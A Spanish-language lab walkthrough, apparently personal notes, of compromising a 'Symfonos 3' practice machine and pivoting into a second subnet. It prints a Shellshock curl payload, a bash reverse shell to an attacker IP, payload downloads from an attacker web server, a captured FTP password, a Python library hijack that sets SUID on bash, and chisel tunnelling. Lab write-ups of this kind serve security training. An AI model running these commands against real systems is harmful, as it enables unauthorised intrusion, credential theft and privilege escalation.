tags:
____
### MAPA DE RED
___
Inicialmente he instalado las dos máquinas que me van a servir para hacer el pivoting. La intrusión la voy a realizar en la Symfonos 1 y posteriormente ralizar el pivoting para entrar en la Symfonos 2.
Al importar las dos máquinas y ejecutar un escaneo de la red, vemos lo siguiente:

```bash
sudo arp-scan -I eth0 --localnet
```

![[Anexos/Pasted image 20251202220443.png]]
### 192.168.0.204 - SYMFONOS 3
____
Para empezar con el reconocimiento voy a comenzar lanzando un ping a la máquina para comprobar si tengo conectividad:

```bash
ping -c 1 192.168.0.204
```

![[Anexos/Pasted image 20251127202306.png]]

Tengo conectividad, y además puedo saber que se trata de una máquina linux por el TTL. Ahora es turno de realizar un escaneo de puertos para comprobar cuales se encuentran abiertos para intentar buscar un punto de entrada. Para ello uso el siguiente comando de nmap:

```bash
nmap -sS -n -Pn -vvv --open -p- 192.168.0.204 --min-rate 5000 -oN ports
```

![[Pasted image 20251127202226.png]]

```bash
nmap -sCV -p21,22,80 -n -vvv -Pn --min-rate 5000 192.168.0.204 -oN version
```

![[Pasted image 20251127202239.png]]

En lo primero que me fijo es que en el puerto 21 tenemos una versión vulnerable del servicio proftpd, la 1.3.5b, pero tras probar usar los exploits para la versión 1.3.5, no obtengo resultado.
Voy a aplicar fuzzing a la web para intentar descubrir archivos y/o directorios ocultos, usando gobuster con el siguiente comando:

```bash
gobuster dir -u http://192.168.0.204 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,xml,html,txt -o dirs.txt --add-slash
```

![[Pasted image 20251129164431.png]]

Encontramos el directorio **gate** y **cgi-bin**, pero al no haber nada más que una imagen en **/gate**, vamos a seguir haciendo fuzzing para descubrir si dentro de estos directorios hay algo más:

```bash
gobuster dir -u http://192.168.0.204/gate -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,xml,html,txt -o dirs2.txt 
```

![[Pasted image 20251129162940.png]]

Aquí tenemos el directorio **cerberus**, el cual solamente muestra una imagen y no es posible continuar por aquí. 

Al hacer fuzzing al directorio **/cgi-bin/**, econtramos el directorio **underworld**, que nos arroja este contenido dinámico:

![[Anexos/Pasted image 20251201154355.png]]

Voy a centrarme en el recurso **/cgi-bin/underworld** ya que esto a veces es indicativo de un ataque tipo shell shock siempre que la versión de la bash sea lo suficientemente antigua. Para probar hacer un ataque shell shock, se deben seguir los pasos de [[Vulnerabilidades/Shell shock/Shell shock]]. A modo de resumen, esta vulnerabilidad se sucede cambiando el user-agent de la página, que se puede hacer tanto con burpsuite como desde consola. Voy a hacerlo desde consola, usando el siguiente comando:

```bash
curl -s -X GET "http://192.168.0.204/cgi-bin/underworld" -H "User-Agent: () { :; }; echo; /usr/bin/whoami"
```

![[Anexos/Pasted image 20251201154609.png]]

Esto significa que tenemos ejecución remota de comandos, por lo que inmediatamente vamos a tratar de convertir esto en una reverse shell, usando el siguiente comando sustituyendo a la cadena **/usr/bin/whoami** del comando anterior:

```bash
bash -c "bash -i >& /dev/tcp/192.168.0.28/443 0>&1"

curl -s -X GET "http://192.168.0.204/cgi-bin/underworld" -H "User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.0.28/443 0>&1'"
```

Me pongo en escucha usando netcat por el puerto 443, y obtenemos una reverse shell del usuario cerberus:

![[Pasted image 20251202155728.png]]

Ahora para escalar privilegios, voy a usar la herramienta pspy para interceptar comandos que se estén ejecutando en intervalos regulares de tiempo por algún usuario. Para ello voy a descargarme el ejecutable en mi máquina de atacante y mediante un servidor web con python por el puerto 80 me lo descargo en la máquina víctima:

```bash
python3 -m http.server 80
wget http://192.168.0.28/psp64
chmod +x pspy64
./pspy64
```

![[Pasted image 20251202192832.png]]

Después de esperar unos minutos, veo lo siguiente:

![[Pasted image 20251202193158.png]]

Root está ejecutando un script de python en la ruta /opt:

![[Anexos/Pasted image 20251202193453.png]]

No se puede acceder a este directorio porque no somos ni root ni hades, pero como he visto que estoy dentro del grupo pcap, puedo ponerme en escucha con tcpdump por la interfaz loopback para ver qué capturo:

```bash
tcpdump -i lo -w captura.cap -v
```

Después de unos minutos corto la conexión y revisando la captura vemos lo siguiente:

![[Anexos/Pasted image 20251202193955.png]]

La contraseña por FTP para el usuario hades es:

```bash
hades:PTpZTfU4vxgzvRBE
```

He comprobado si hay reutilización de contraseña para el servicio ssh y efectivamente así ha sido. Ahora veo que este usuario está dentro de un grupo llamado **gods**, así que puede ser buena idea buscar qué archivos hay en el sistema asignados a ese gurpo, con el siguiente comando:

```bash
find / -groups gods -writable 2>/dev/null | grep "ftp"
```

![[Anexos/Pasted image 20251202210536.png]]

Hay dos librerías que contienen el nombre ftp, por lo que podemos suponer que una de ellas está siendo usada por el archivo ftpclient.py, así que vamos a hacer un Python library hijacking para elevar privilegios al usuario root. Para ello, como tengo permisos de escritura dentro del archivo, voy a añadir la siguiente línea de código para que en el momento que root ejecute el script, se ejecute también mi orden:

```python
import os os.system('chmod u+s /bin/bash')
```

![[Anexos/Pasted image 20251202211512.png]]

Esperamos un par de minutos y ha funcionado:

![[Anexos/Pasted image 20251202211721.png]]

Ahora simplemente ejecuto el comando **bash -p** y ya soy root:

![[Anexos/Pasted image 20251202211936.png]]

### 10.10.10.131 - MICROCHOFT - PIVOTING VNET2
_____
Aunque este paso de rootear la máquina no es estrictamente necesario, nunca está de más. Antes de comenzar con el pivoting voy a revisar cuáles son las interfaces de red  a las que está conectada la máquina SYMFONOS 3, con el comando **ip a**:

![[Anexos/Pasted image 20251202214201.png]]

Además de la ip que se encuentra en el segmento de red 192.168.0 vemos otra red, la 10.10.10.0. Ahora comenzamos con el pivoting y el hackeo de las siguientes máquinas. Para ello primero voy a hacer un descubrimiento sencillo tanto de hosts como de los puertos usando dos oneliners de bash, que se usaron en el pivoting de las máquinas SYMFONOS 1 y SYMFONOS 2: [[Labs/VulnHub/SYMFONOS 1 - SYMFONOS 2 - PIVOTING]]

```bash 
seq 1 254 | xargs -P 100 -I HOST bash -c "ping -c 1 -W 2 10.10.10.HOST &>/dev/null && echo '[+] Host descubierto: 10.10.10.HOST'"
```

![[Anexos/Pasted image 20251207190334.png]]

Ahora que hemos localizado el host, vamos a intentar descubrir algunos puertos abiertos antes de entablar el port forwarding y el proxy. Para ello usamos otro comando oneliner de bash:

```bash
seq 1 65535 | xargs -P 500 -I PORT bash -c "bash -c 'echo > /dev/tcp/10.10.10.141/PORT' 2>/dev/null && echo '[+] Se ha encontrado un puerto abierto: PORT'"
```

![[Anexos/Pasted image 20251207190753.png]]

Vemos que están abiertos varios puertos, pero esto solamente es un acercamiento inicial. Ahora voy a crear el tunel con chisel y a asegurarme que proxychains está correctamente configurado para comenzar con el hackeo a la máquina. Para esto, primero debo enviar el archivo de chisel ejecutable a la máquina SYMF 3 mediante un servior http con python por el puerto 80. Una vez obtenido chisel en la máquina SYMF3 le doy permisos de ejecución y ya puedo comenzar a montar el tunel. Primero ejecutamos el siguiente comando en la máquina ATACANTE:

```bash
chisel server --reverse -p 1234
```

![[Anexos/Pasted image 20251203202524.png]]

#### NOTA RECORDATORIA PROXYCHAINS
____
Para que proxychains funcione correctamente se debe de haber introducido una línea extra en el archivo de configuración de proxychains, que se encuentra en **/etc/proxychains4.conf**. Esto es para que las comunicaciones pasen siempre por nuestro localhost:

![[Anexos/Pasted image 20251203202807.png]]

Ahora para continuar, vamos a conectarnos al server que acabamos de crear, ejecutando el siguiente comando con chisel desde la máquina víctima:

```bash
./chisel client 192.168.0.28:1234 R:socks
```

![[Anexos/Pasted image 20251203203110.png]]

Ahora ya podemos hacer uso de proxychains para ejecutar comandos en la máquina FUFF, la cual está en un segmento de red al cual no teníamos acceso en un principio. Lo primero que voy a hacer es ejecutar nmap para hacer port discovery y confirmar los dos puertos que ya tenía descubiertos de antes. Para ello uso el siguiente comando:

```bash
sudo proxychains4 nmap --top-ports 2500 -sT -n -Pn -vvv --open -oN ports 10.10.10.141 2>/dev/null
```

![[Anexos/Pasted image 20251207211835.png]]

Ahora vamos a comprobar la versión de los servicios que corren por estos puertos, así como lanzar los típicos scripts de reconocimiento iniciales:

```bash
sudo proxychains4 nmap -sCV -sT -n -Pn -p135,139,445,49152,49153,49154,49155,49156,49157 -oN version 10.10.10.141
```

![[Anexos/Pasted image 20251207212338.png]]

Viendo que el puerto 445 está abierto voy a probar listar los recursos compartidos de la web usando una null session con smbmap, con el siguiente comando:

```bash
sudo proxychains4 smbmap -H 10.10.10.141
```

